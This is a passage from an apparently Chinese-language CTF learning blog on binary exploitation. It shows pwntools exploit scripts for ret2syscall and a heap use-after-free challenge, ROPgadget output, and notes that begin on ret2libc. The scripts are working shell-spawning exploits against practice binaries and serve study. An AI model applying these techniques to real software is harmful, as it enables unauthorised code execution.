&lt;h2 id=&#34;特定漏洞相关资源&#34;&gt;&lt;a href=&#34;#特定漏洞相关资源&#34; class=&#34;headerlink&#34; title=&#34;特定漏洞相关资源&#34;&gt;&lt;/a&gt;特定漏洞相关资源&lt;/h2&gt;&lt;h3 id=&#34;堆&#34;&gt;&lt;a href=&#34;#堆&#34; class=&#34;headerlink&#34; title=&#34;堆&#34;&gt;&lt;/a&gt;堆&lt;/h3&gt;&lt;p&gt;how2heap(github)&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://bbs.kanxue.com/thread-272416.htm#msg_header_h1_2&#34;&gt;https://bbs.kanxue.com/thread-272416.htm#msg_header_h1_2&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;待整理资源&#34;&gt;&lt;a href=&#34;#待整理资源&#34; class=&#34;headerlink&#34; title=&#34;待整理资源&#34;&gt;&lt;/a&gt;待整理资源&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Breeze_CAT/article/details/103788631&#34;&gt;https://blog.csdn.net/Breeze_CAT/article/details/103788631&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;其他&#34;&gt;&lt;a href=&#34;#其他&#34; class=&#34;headerlink&#34; title=&#34;其他&#34;&gt;&lt;/a&gt;其他&lt;/h1&gt;&lt;p&gt;查看系统调用&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl&#34;&gt;https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;系统调用参考\查看系统调用参数&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://syscalls64.paolostivanin.com/&#34;&gt;https://syscalls64.paolostivanin.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://elixir.bootlin.com/linux/v5.19/C/ident/getname&#34;&gt;https://elixir.bootlin.com/linux/v5.19/C/ident/getname&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;macbook 快捷键&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://dragon-li.gitee.io/my-wiki/doc/mac/005-Mac%E4%B8%8BIterm2%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%BF%AB%E6%8D%B7%E9%94%AE.html&#34;&gt;http://dragon-li.gitee.io/my-wiki/doc/mac/005-Mac下Iterm2使用及快捷键.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;解题模版&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.arch=&lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt; //&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./ret2syscall&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(sh,&lt;span class=&#34;string&#34;&gt;&amp;quot;break *0x8048e96&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh = &lt;span class=&#34;number&#34;&gt;0x080BE408&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edxecxebx = &lt;span class=&#34;number&#34;&gt;0x0806eb90&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eaxret = &lt;span class=&#34;number&#34;&gt;0x080bb196&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int80 = &lt;span class=&#34;number&#34;&gt;0x08049421&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*(&lt;span class=&#34;number&#34;&gt;108&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;) + p32(eaxret)  + p32(&lt;span class=&#34;number&#34;&gt;0xb&lt;/span&gt;) + p32(edxecxebx) + p32(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p32(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p32(&lt;span class=&#34;number&#34;&gt;0x080BE408&lt;/span&gt;)+p32(int80)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.arch=&lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./hacknote&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;length,context&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;size&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(length))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content&amp;quot;&lt;/span&gt;,context)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;delete&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;Print&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;3&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;aaa&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;bbb&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,p32(&lt;span class=&#34;number&#34;&gt;0x08048986&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Print(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#io.recv(1024)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;libc版本问题,需要换一下&lt;/p&gt;
&lt;p&gt;2.27&lt;/p&gt;
&lt;p&gt;[DEBUG] Received 0x29 bytes:&lt;br&gt;    b’free(): double free detected in tcache 2\n’&lt;/p&gt;
</content>
        <updated>2023-02-18T11:36:51.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/</id>
        <title>pwn入门-9-栈溢出ret2系列</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/"/>
        <content type="html">&lt;p&gt;这部分主要来源于ctf-wiki&lt;/p&gt;
&lt;h1 id=&#34;ret2syscall&#34;&gt;&lt;a href=&#34;#ret2syscall&#34; class=&#34;headerlink&#34; title=&#34;ret2syscall&#34;&gt;&lt;/a&gt;ret2syscall&lt;/h1&gt;&lt;p&gt;​		这个其实就是利用了系统调用(syscall), 什么是系统调用呢? 参看基础知识篇,这里没有system了,但是不影响getshell,因为system的底层是调用的execve系统调用,我们只需要找到gadget,来构造系统调用,调用execve,然后传入参数&amp;#x2F;bin&amp;#x2F;sh,即可. 即 execve(“&amp;#x2F;bin&amp;#x2F;sh”)&lt;/p&gt;
&lt;p&gt;​		针对系统调用还有很多其他的利用方法,比如经典的ROW,就是说如果我们不能够执行execve getshell的话,我们可以想办法读取flag,毕竟我们的目的就是拿到flag,可以进行read open write将flag写入一个地方,然后打印出来即可.(后面再写相关的)&lt;/p&gt;
&lt;p&gt;​		这里我们利用的是 execve(“&amp;#x2F;bin&amp;#x2F;sh”,NULL,NULL),&lt;font color=&#34;red&#34;&gt;系统调用的参数不是根据那个调用约定了.  不用栈传参了,都需要用到寄存器&lt;/font&gt;eax ebx ecx edx 分别存放 系统调用号和第 1 2 3 个参数, 所以他们的值分别为 0xb &amp;#x2F;bin&amp;#x2F;sh 0 0 , .rodata:080BE408 aBinSh          db ‘&amp;#x2F;bin&amp;#x2F;sh’,0  这个地址里存放着&amp;#x2F;bin&amp;#x2F;sh&lt;/p&gt;
&lt;p&gt;buf 108 + 4 ebp + retaddress &lt;/p&gt;
&lt;h2 id=&#34;寻找gadget&#34;&gt;&lt;a href=&#34;#寻找gadget&#34; class=&#34;headerlink&#34; title=&#34;寻找gadget&#34;&gt;&lt;/a&gt;寻找gadget&lt;/h2&gt;&lt;p&gt;​		要找到int 0x80 gadget,以及那几个pop, 利用ROPgadget ,具体语句及结果如下&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ROPgadget --binary rop  --only &lt;span class=&#34;string&#34;&gt;&amp;#x27;pop|ret&amp;#x27;&lt;/span&gt; | grep &lt;span class=&#34;string&#34;&gt;&amp;#x27;eax&amp;#x27;&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ROPgadget --binary ret2syscall  --only &lt;span class=&#34;string&#34;&gt;&amp;#x27;int&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x0806eb90&lt;/span&gt; : pop edx ; pop ecx ; pop ebx ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x080bb196&lt;/span&gt; : pop eax ; ret  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x08049421&lt;/span&gt; : &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h2&gt;&lt;p&gt;所以payload构造如下&lt;br&gt;binsh &amp;#x3D; 0x080BE408&lt;br&gt;edxecxebx &amp;#x3D; 0x0806eb90&lt;br&gt;eaxret &amp;#x3D; 0x080bb196&lt;br&gt;int80 &amp;#x3D; 0x08049421&lt;br&gt;payload &amp;#x3D; b”a”*(108 + 4) + p32(eaxret)  + p32(0xb) + p32(edxecxebx) + p32(0) + p32(0) + p32(0x080BE408) + p32(int80)&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./ret2syscall&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(sh,&lt;span class=&#34;string&#34;&gt;&amp;quot;break *0x8048e96&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh = &lt;span class=&#34;number&#34;&gt;0x080BE408&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edxecxebx = &lt;span class=&#34;number&#34;&gt;0x0806eb90&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eaxret = &lt;span class=&#34;number&#34;&gt;0x080bb196&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int80 = &lt;span class=&#34;number&#34;&gt;0x08049421&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*(&lt;span class=&#34;number&#34;&gt;108&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;) + p32(eaxret)  + p32(&lt;span class=&#34;number&#34;&gt;0xb&lt;/span&gt;) + p32(edxecxebx) + p32(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p32(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p32(&lt;span class=&#34;number&#34;&gt;0x080BE408&lt;/span&gt;)+p32(int80)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;关于esp和ret的关系,ret后esp怎么移动等,需要再看看&lt;/p&gt;
&lt;p&gt;Pop 一次后, esp往高地址移动一个地址&lt;/p&gt;
&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230218192128330.png&#34; alt=&#34;image-20230218192128330&#34; style=&#34;zoom: 33%;&#34;&gt;



&lt;p&gt;为什么ret后就到了栈的下一个地址???&lt;/p&gt;
&lt;p&gt;ret的时候, esp就指向了返回地址那一行,执行完pop后,esp移动到下一个gadget,然后ret弹出这个gadget的地址,作为下一条指令,由此一步步跟进&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230218192552976.png&#34; alt=&#34;image-20230218192552976&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;ret2libc&#34;&gt;&lt;a href=&#34;#ret2libc&#34; class=&#34;headerlink&#34; title=&#34;ret2libc&#34;&gt;&lt;/a&gt;ret2libc&lt;/h1&gt;&lt;p&gt;​		执行libc中的函数,一个关键点是找对libc版本.&lt;/p&gt;
&lt;p&gt;​		通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)(它们的关系???????)&lt;/p&gt;
&lt;h2 id=&#34;re2libc1&#34;&gt;&lt;a href=&#34;#re2libc1&#34; class=&#34;headerlink&#34; title=&#34;re2libc1&#34;&gt;&lt;/a&gt;re2libc1&lt;/h2&gt;&lt;p&gt;​		反汇编代码&lt;/p&gt;
&lt;p&gt;​		先从它自身寻找system和&amp;#x2F;bin&amp;#x2F;sh&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ROPgadget --binary ret2libc1 --&lt;span class=&#34;built_in&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;/bin/sh&amp;#x27;&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x08048720&lt;/span&gt; : /bin/sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;# objdump -d ret2libc1 | grep &lt;span class=&#34;string&#34;&gt;&amp;quot;system&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;08048460&lt;/span&gt; &amp;lt;system@plt&amp;gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;8048611&lt;/span&gt;:	e8 &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;a fe ff ff       	call   &lt;span class=&#34;number&#34;&gt;8048460&lt;/span&gt; 